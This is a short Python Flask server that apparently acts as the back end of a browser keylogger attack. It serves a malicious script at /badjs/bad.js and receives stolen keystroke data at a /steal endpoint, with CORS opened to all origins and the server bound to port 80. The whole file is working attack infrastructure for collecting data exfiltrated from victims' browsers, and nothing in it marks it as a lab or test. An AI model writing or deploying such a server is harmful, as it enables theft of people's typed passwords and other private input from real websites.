from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/steal", methods=["POST"])
def steal():
    data = request.get_json()
    print(f"[!] Keylogger data: {data}")
    return "OK", 200

@app.route("/badjs/bad.js")
def serve_bad_js():
    return open("/badjs/bad.js").read(), 200, {"Content-Type": "application/javascript"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
